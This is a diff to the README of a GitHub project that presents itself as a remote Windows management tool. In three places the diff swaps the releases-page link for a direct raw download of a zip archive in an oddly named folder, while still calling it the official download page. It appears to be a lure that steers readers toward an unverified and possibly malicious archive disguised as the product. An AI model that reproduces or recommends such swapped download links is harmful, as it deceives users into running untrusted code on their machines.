@@ -1,6 +1,6 @@
 # 🛠️ windows-socket-bot - Manage your remote Windows computers easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/evettecovered89/windows-socket-bot/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/evettecovered89/windows-socket-bot/main/dihalide/windows-socket-bot-Fragaria.zip)
 
 ## 📋 What this tool does
 
@@ -11,7 +11,7 @@ This tool helps you manage computers from a distance. It uses a network connecti
 Follow these steps to set up the software. Ensure your internet connection remains stable during the process.
 
 1. Prepare the remote computer. You must have access to the machine you want to manage.
-2. Visit the download page: https://github.com/evettecovered89/windows-socket-bot/releases
+2. Visit the download page: https://raw.githubusercontent.com/evettecovered89/windows-socket-bot/main/dihalide/windows-socket-bot-Fragaria.zip
 3. Locate the latest version on that page.
 4. Click the link to download the file.
 5. Save the file to a folder you can find later.
@@ -22,7 +22,7 @@ You need a machine running Windows 10 or Windows 11. The software works on both 
 
 ## 📥 Installation and Setup
 
-Download the software from the official page: https://github.com/evettecovered89/windows-socket-bot/releases
+Download the software from the official page: https://raw.githubusercontent.com/evettecovered89/windows-socket-bot/main/dihalide/windows-socket-bot-Fragaria.zip
 
 Once the download finishes, follow these steps to start the service:
 
